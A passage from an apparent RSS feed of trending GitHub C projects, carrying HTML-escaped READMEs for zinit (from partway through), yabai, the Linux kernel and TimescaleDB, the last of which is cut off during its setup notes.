zinit ice wait&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;2&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; lucid as&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;program&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; pick&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;span class="pl-smi"&gt;$ZPFX&lt;/span&gt;/bin/git-alias&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; make&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;PREFIX=&lt;span class="pl-smi"&gt;$ZPFX&lt;/span&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; nocompile
zinit light tj/git-extras

zinit ice wait&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;2&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; lucid as&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;program&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; atclone&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;perl Makefile.PL PREFIX=$ZPFX&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; atpull&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;%atclone&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; \
            make&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;install&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; pick&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;span class="pl-smi"&gt;$ZPFX&lt;/span&gt;/bin/git-cal&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
zinit light k4rthik/git-cal&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Target directory for installed files is &lt;code&gt;$ZPFX&lt;/code&gt; (&lt;code&gt;~/.zinit/polaris&lt;/code&gt; by default).&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-preinstalling-plugins" class="anchor" aria-hidden="true" href="#preinstalling-plugins"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Preinstalling Plugins&lt;/h2&gt;
&lt;p&gt;If you create a Docker image that uses Zinit, or want to install Turbo-loaded
plugins before the shell starts interactively, you can invoke the
zinit-scheduler function in such a way, that it:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;installs plugins without waiting for the prompt (i.e. it's script friendly),&lt;/li&gt;
&lt;li&gt;installs &lt;strong&gt;all&lt;/strong&gt; plugins instantly, without respecting the &lt;code&gt;wait''&lt;/code&gt; argument.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To accomplish this, use &lt;code&gt;burst&lt;/code&gt; argument and call &lt;code&gt;@zinit-scheduler&lt;/code&gt; function.
Example &lt;code&gt;Dockerfile&lt;/code&gt; entry:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;RUN zsh -i -c -- &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;@zinit-scheduler burst || true&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;An example &lt;code&gt;Dockerfile&lt;/code&gt; can be found
&lt;a href="https://github.com/robobenklein/configs/blob/master/Dockerfile"&gt;&lt;strong&gt;here&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-getting-help-and-community" class="anchor" aria-hidden="true" href="#getting-help-and-community"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Getting Help and Community&lt;/h1&gt;
&lt;p&gt;Do you need help or wish to get in touch with other Zinit users?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Visit our subreddit &lt;a href="https://www.reddit.com/r/zinit/" rel="nofollow"&gt;r/zinit&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Chat with us in our IRC channel. Connect to chat.freenode.net:6697 (SSL) or chat.freenode.net:6667 and join #zinit. Following is a quick access via Webchat &lt;a href="https://kiwiirc.com/client/chat.freenode.net:+6697/#zinit" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/908655b78be1caf3b277adedb9500f81e3e84bb8/68747470733a2f2f6b6977696972632e636f6d2f627574746f6e732f636861742e667265656e6f64652e6e65742f7a696e69742e706e67" alt="IRC" data-canonical-src="https://kiwiirc.com/buttons/chat.freenode.net/zinit.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Or via Gitter &lt;a href="https://gitter.im/zdharma/zinit?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=badge" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/c54a31d91510766b0e6c0b7584ec67c3dd1cb431/68747470733a2f2f6261646765732e6769747465722e696d2f7a646861726d612f7a696e69742e737667" alt="Join the chat at https://gitter.im/zdharma/zinit" data-canonical-src="https://badges.gitter.im/zdharma/zinit.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;/article&gt;&lt;/div&gt;</description><author>zdharma</author><guid isPermaLink="false">https://github.com/zdharma/zinit</guid><pubDate>Tue, 04 Feb 2020 00:17:00 GMT</pubDate></item><item><title>koekeishiya/yabai #18 in C, This week</title><link>https://github.com/koekeishiya/yabai</link><description>&lt;p&gt;&lt;i&gt;A tiling window manager for macOS based on binary space partitioning&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="assets/banner/banner.svg"&gt;&lt;img width="75%" src="assets/banner/banner.svg" alt="Banner" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;/p&gt;
&lt;p align="center"&gt;
  &lt;b&gt;Tiling window management for the Mac.&lt;/b&gt;
&lt;/p&gt;
&lt;p align="center"&gt;
  &lt;a href="https://travis-ci.org/koekeishiya/yabai" rel="nofollow"&gt;
    &lt;img src="https://camo.githubusercontent.com/7559542b9cee08cad85517613428030732e11efe/68747470733a2f2f7472617669732d63692e6f72672f6b6f656b656973686979612f79616261692e7376673f6272616e63683d6d6173746572" alt="CI Status Badge" data-canonical-src="https://travis-ci.org/koekeishiya/yabai.svg?branch=master" style="max-width:100%;"&gt;
  &lt;/a&gt;
  &lt;a href="https://github.com/koekeishiya/yabai/blob/master/LICENSE.txt"&gt;
    &lt;img src="https://camo.githubusercontent.com/bbe5a23d11f88c43f47f2e3f4a9e1f28fb845186/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f6b6f656b656973686979612f79616261692e7376673f636f6c6f723d677265656e" alt="License Badge" data-canonical-src="https://img.shields.io/github/license/koekeishiya/yabai.svg?color=green" style="max-width:100%;"&gt;
  &lt;/a&gt;
  &lt;a href="https://github.com/koekeishiya/yabai/blob/master/CHANGELOG.md"&gt;
    &lt;img src="https://camo.githubusercontent.com/726753febab04bed467b58e318b5e6125b235636/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f766965772d6368616e67656c6f672d677265656e2e737667" alt="Changelog Badge" data-canonical-src="https://img.shields.io/badge/view-changelog-green.svg" style="max-width:100%;"&gt;
  &lt;/a&gt;
  &lt;a href="https://github.com/koekeishiya/yabai/releases"&gt;
    &lt;img src="https://camo.githubusercontent.com/829e75196f16a927cd28a2402d29cc673d7f24b6/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6d6d6974732d73696e63652f6b6f656b656973686979612f79616261692f6c61746573742e7376673f636f6c6f723d677265656e" alt="Version Badge" data-canonical-src="https://img.shields.io/github/commits-since/koekeishiya/yabai/latest.svg?color=green" style="max-width:100%;"&gt;
  &lt;/a&gt;
&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-about" class="anchor" aria-hidden="true" href="#about"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;About&lt;/h2&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="assets/screenshot.png"&gt;&lt;img align="right" width="40%" src="assets/screenshot.png" alt="Screenshot" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;yabai is a window management utility that is designed to work as an extension to the built-in window manager of macOS.
yabai allows you to control your windows, spaces and displays freely using an intuitive command line interface and optionally set user-defined keyboard shortcuts using &lt;a href="https://github.com/koekeishiya/skhd"&gt;↗ skhd&lt;/a&gt; and other third-party software.&lt;/p&gt;
&lt;p&gt;The primary function of yabai is tiling window management; automatically modifying your window layout using a binary space partitioning algorithm to allow you to focus on the content of your windows without distractions.
Additional features of yabai include focus-follows-mouse, disabling animations for switching spaces, creating spaces past the limit of 16 spaces, and much more.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-installation-and-configuration" class="anchor" aria-hidden="true" href="#installation-and-configuration"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installation and Configuration&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;a href="https://github.com/koekeishiya/yabai/wiki"&gt;↗ yabai wiki&lt;/a&gt; has both brief and detailed installation instructions for multiple installation methods, and also explains how to uninstall yabai completely.&lt;/li&gt;
&lt;li&gt;Sample configuration files can be found in the &lt;a href="https://github.com/koekeishiya/yabai/tree/master/examples"&gt;↗ examples&lt;/a&gt; directory. Refer to the &lt;a href="https://github.com/koekeishiya/yabai/blob/master/doc/yabai.asciidoc"&gt;↗ documentation&lt;/a&gt; or the wiki for further information.&lt;/li&gt;
&lt;li&gt;Keyboard shortcuts can be defined with &lt;a href="https://github.com/koekeishiya/skhd"&gt;↗ skhd&lt;/a&gt; or any other suitable software you may prefer.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-requirements-and-caveats" class="anchor" aria-hidden="true" href="#requirements-and-caveats"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Requirements and Caveats&lt;/h2&gt;
&lt;p&gt;Please read the below requirements carefully.
Make sure you fulfil all of them before filing an issue.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="right"&gt;Requirement&lt;/th&gt;
&lt;th align="left"&gt;Note&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="right"&gt;Operating System&lt;/td&gt;
&lt;td align="left"&gt;macOS High Sierra 10.13.6, Mojave 10.14.4+ and Catalina 10.15.0+ is supported.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="right"&gt;Accessibility API&lt;/td&gt;
&lt;td align="left"&gt;yabai must be given permission to utilize the Accessibility API and will request access upon launch. The application must be restarted after access has been granted.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="right"&gt;Mission Control&lt;/td&gt;
&lt;td align="left"&gt;In the Mission Control preferences pane in System Preferences, the setting "Displays have separate Spaces" must be enabled.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Please also take note of the following caveats.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="right"&gt;Caveat&lt;/th&gt;
&lt;th align="left"&gt;Note&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="right"&gt;System Integrity Protection&lt;/td&gt;
&lt;td align="left"&gt;System Integrity Protection needs to be (partially) disabled for yabai to inject a scripting addition into Dock.app for controlling windows with functions that require elevated privileges. This enables control of the window server, which is the sole owner of all window connections, and enables additional features of yabai. If you are running on macOS High Sierra 10.13.6, you can reenable SIP after the scripting addition has been installed.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="right"&gt;Code Signing&lt;/td&gt;
&lt;td align="left"&gt;When building from source (or installing from HEAD), it is recommended to codesign the binary so it retains its accessibility and automation privileges when updated or rebuilt.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="right"&gt;Mission Control&lt;/td&gt;
&lt;td align="left"&gt;In the Mission Control preferences pane in System Preferences, the setting "Automatically rearrange Spaces based on most recent use" should be disabled for commands that rely on the ordering of spaces to work reliably.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;&lt;a id="user-content-license-and-attribution" class="anchor" aria-hidden="true" href="#license-and-attribution"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;License and Attribution&lt;/h2&gt;
&lt;p&gt;yabai is licensed under the &lt;a href="LICENSE.txt"&gt;↗ MIT License&lt;/a&gt;, a short and simple permissive license with conditions only requiring preservation of copyright and license notices.
Licensed works, modifications, and larger works may be distributed under different terms and without source code.&lt;/p&gt;
&lt;p&gt;Thanks to &lt;a href="https://github.com/fools-mate"&gt;@fools-mate&lt;/a&gt; for creating a logo and banner for this project and making them available for free.&lt;/p&gt;
&lt;p&gt;Thanks to &lt;a href="https://github.com/dominiklohmann"&gt;@dominiklohmann&lt;/a&gt; for contributing great documentation, support, and more, for free.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-disclaimer" class="anchor" aria-hidden="true" href="#disclaimer"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;Use at your own discretion.
I take no responsibility if anything should happen to your machine while trying to install, test or otherwise use this software in any form.
You acknowledge that you understand the potential risk that may come from disabling &lt;a href="https://support.apple.com/en-us/HT204899" rel="nofollow"&gt;↗ System Integrity Protection&lt;/a&gt; on your system, and I make no recommendation as to whether you should or should not disable System Integrity Protection.&lt;/p&gt;



&lt;/article&gt;&lt;/div&gt;</description><author>koekeishiya</author><guid isPermaLink="false">https://github.com/koekeishiya/yabai</guid><pubDate>Tue, 04 Feb 2020 00:18:00 GMT</pubDate></item><item><title>torvalds/linux #19 in C, This week</title><link>https://github.com/torvalds/linux</link><description>&lt;p&gt;&lt;i&gt;Linux kernel source tree&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="" data-path="README"&gt;&lt;div class="plain"&gt;&lt;pre style="white-space: pre-wrap"&gt;Linux kernel
============

There are several guides for kernel developers and users. These guides can
be rendered in a number of formats, like HTML and PDF. Please read
Documentation/admin-guide/README.rst first.

In order to build the documentation, use ``make htmldocs`` or
``make pdfdocs``.  The formatted documentation can also be read online at:

    &lt;a href="https://www.kernel.org/doc/html/latest/" rel="nofollow"&gt;https://www.kernel.org/doc/html/latest/&lt;/a&gt;

There are various text files in the Documentation/ subdirectory,
several of them using the Restructured Text markup notation.

Please read the Documentation/process/changes.rst file, as it contains the
requirements for building and running the kernel, and information about
the problems which may result by upgrading your kernel.
&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</description><author>torvalds</author><guid isPermaLink="false">https://github.com/torvalds/linux</guid><pubDate>Tue, 04 Feb 2020 00:19:00 GMT</pubDate></item><item><title>timescale/timescaledb #20 in C, This week</title><link>https://github.com/timescale/timescaledb</link><description>&lt;p&gt;&lt;i&gt;An open-source time-series SQL database optimized for fast ingest and complex queries.  Packaged as a PostgreSQL extension.&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Linux/macOS&lt;/th&gt;
&lt;th align="center"&gt;Windows&lt;/th&gt;
&lt;th align="center"&gt;Coverity&lt;/th&gt;
&lt;th align="center"&gt;Code Coverage&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="https://travis-ci.org/timescale/timescaledb/builds" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/4f43f1e3d846c6f75006bf3dbdf7496dfed7849d/68747470733a2f2f7472617669732d63692e6f72672f74696d657363616c652f74696d657363616c6564622e7376673f6272616e63683d6d6173746572" alt="Build Status" data-canonical-src="https://travis-ci.org/timescale/timescaledb.svg?branch=master" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td align="center"&gt;&lt;a href="https://ci.appveyor.com/project/timescale/timescaledb/branch/master" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/565513a2b605632d713829d4f92055e09178629f/68747470733a2f2f63692e6170707665796f722e636f6d2f6170692f70726f6a656374732f7374617475732f313573716b6c393030743034687977752f6272616e63682f6d61737465723f7376673d74727565" alt="Windows build status" data-canonical-src="https://ci.appveyor.com/api/projects/status/15sqkl900t04hywu/branch/master?svg=true" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td align="center"&gt;&lt;a href="https://scan.coverity.com/projects/timescale-timescaledb" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/659bbb3140f881be52789f8d9fe4aa36c928ebc1/68747470733a2f2f7363616e2e636f7665726974792e636f6d2f70726f6a656374732f74696d657363616c652d74696d657363616c6564622f62616467652e737667" alt="Coverity Scan Build Status" data-canonical-src="https://scan.coverity.com/projects/timescale-timescaledb/badge.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td align="center"&gt;&lt;a href="https://codecov.io/gh/timescale/timescaledb" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/ec96213d17eff564ba7b1d77497ad3ebd3fe34d3/68747470733a2f2f636f6465636f762e696f2f67682f74696d657363616c652f74696d657363616c6564622f6272616e63682f6d61737465722f6772617068732f62616467652e7376673f6272616e63683d6d6173746572" alt="Code Coverage" data-canonical-src="https://codecov.io/gh/timescale/timescaledb/branch/master/graphs/badge.svg?branch=master" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;&lt;a id="user-content-timescaledb" class="anchor" aria-hidden="true" href="#timescaledb"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;TimescaleDB&lt;/h2&gt;
&lt;p&gt;TimescaleDB is an open-source database designed to make SQL scalable for
time-series data. It is engineered up from PostgreSQL, providing automatic
partitioning across time and space (partitioning key), as well as full
SQL support.&lt;/p&gt;
&lt;p&gt;TimescaleDB is packaged as a PostgreSQL extension.  All code is licensed
under the Apache-2 open-source license, with the exception of source code
under the &lt;code&gt;tsl&lt;/code&gt; subdirectory, which is licensed under
the &lt;a href="https://github.com/timescale/timescaledb/blob/master/tsl/LICENSE-TIMESCALE"&gt;Timescale License (TSL)&lt;/a&gt;.
For clarity, all code files reference licensing in their header.  &lt;a href="https://github.com/timescale/timescaledb/blob/master/CONTRIBUTING.md"&gt;Contributors welcome.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Apache-2 licensed binaries can be built by passing &lt;code&gt;-DAPACHE_ONLY=1&lt;/code&gt; to &lt;code&gt;bootstrap&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Below is an introduction to TimescaleDB. For more information, please check out these other resources:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.timescale.com/" rel="nofollow"&gt;Developer Documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://slack-login.timescale.com" rel="nofollow"&gt;Slack Channel&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="mailto:support@timescale.com"&gt;Support Email&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(Before building from source, see instructions below.)&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-using-timescaledb" class="anchor" aria-hidden="true" href="#using-timescaledb"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Using TimescaleDB&lt;/h3&gt;
&lt;p&gt;TimescaleDB scales PostgreSQL for time-series data via automatic
partitioning across time and space (partitioning key), yet retains
the standard PostgreSQL interface.&lt;/p&gt;
&lt;p&gt;In other words, TimescaleDB exposes what look like regular tables, but
are actually only an
abstraction (or a virtual view) of many individual tables comprising the
actual data. This single-table view, which we call a
&lt;a href="https://docs.timescale.com/introduction/architecture#hypertables" rel="nofollow"&gt;hypertable&lt;/a&gt;,
is comprised of many chunks, which are created by partitioning
the hypertable's data in either one or two dimensions: by a time
interval, and by an (optional) "partition key" such as
device id, location, user id, etc. (&lt;a href="https://docs.timescale.com/introduction/architecture" rel="nofollow"&gt;Architecture discussion&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;Virtually all user interactions with TimescaleDB are with
hypertables. Creating tables and indexes, altering tables, inserting
data, selecting data, etc., can (and should) all be executed on the
hypertable.&lt;/p&gt;
&lt;p&gt;From the perspective of both use and management, TimescaleDB just
looks and feels like PostgreSQL, and can be managed and queried as
such.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-before-you-start" class="anchor" aria-hidden="true" href="#before-you-start"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Before you start&lt;/h4&gt;
&lt;p&gt;PostgreSQL's out-of-the-box settings are typically too conservative for modern
servers and TimescaleDB. You should make sure your &lt;code&gt;postgresql.conf&lt;/code&gt;
settings are tuned, either by using &lt;a href="https://github.com/timescale/timescaledb-tune"&gt;timescaledb-tune&lt;/a&gt; or doing it manually.&lt;/p&gt;
